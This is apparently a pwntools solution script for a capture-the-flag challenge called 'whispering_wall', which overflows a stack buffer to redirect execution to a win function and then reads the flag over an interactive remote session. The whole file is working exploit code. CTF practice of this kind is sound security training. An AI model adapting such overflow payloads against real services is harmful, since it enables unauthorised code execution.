from pwn import *

elf = context.binary = ELF('./whispering_wall', checksec=False)

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13591)
# stack canary is not enabled. so, it is possible to use cyclic to find the RIP offse, and putting the win address inside it instead. 

win_addr = 0x4011fb
ret_gadget = 0x40101a
# we have to send 24 bytes before the win address
RIP_OFFSET = 24

payload = b'A' * 24
payload += p64(ret_gadget)
payload += p64(win_addr)

p.recvuntil(b'whisper:')
p.send(payload)

sleep(0.5)
p.sendline(b'cat flag')
p.interactive()